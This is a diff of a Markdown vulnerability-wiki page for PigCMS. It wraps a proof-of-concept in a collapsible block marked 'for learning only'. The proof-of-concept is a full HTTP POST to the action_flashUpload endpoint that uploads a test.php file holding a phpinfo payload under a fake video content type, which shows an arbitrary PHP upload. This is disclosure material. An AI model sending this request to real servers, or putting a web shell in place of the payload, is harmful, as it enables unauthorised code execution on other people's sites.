@@ -33,8 +33,10 @@ app.name="PigCMS"
 
 验证POC
 
-```
-POST /cms/manage/admin.php?m=manage&c=background&a=action_flashUpload HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST /cms/manage/admin.php?m=manage&amp;c=background&amp;a=action_flashUpload HTTP/1.1
 Host:
 Accept-Encoding: gzip, deflate
 Content-Type: multipart/form-data; boundary=----aaa
@@ -43,9 +45,10 @@ Content-Type: multipart/form-data; boundary=----aaa
 Content-Disposition: form-data; name="filePath"; filename="test.php"
 Content-Type: video/x-flv
 
-<?php phpinfo();?>
-------aaa
-```
+&lt;?php phpinfo();?&gt;
+------aaa</code></pre>
+
+</details>
 
 ![image-20230828161506565](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/image-20230828161506565.png)
 
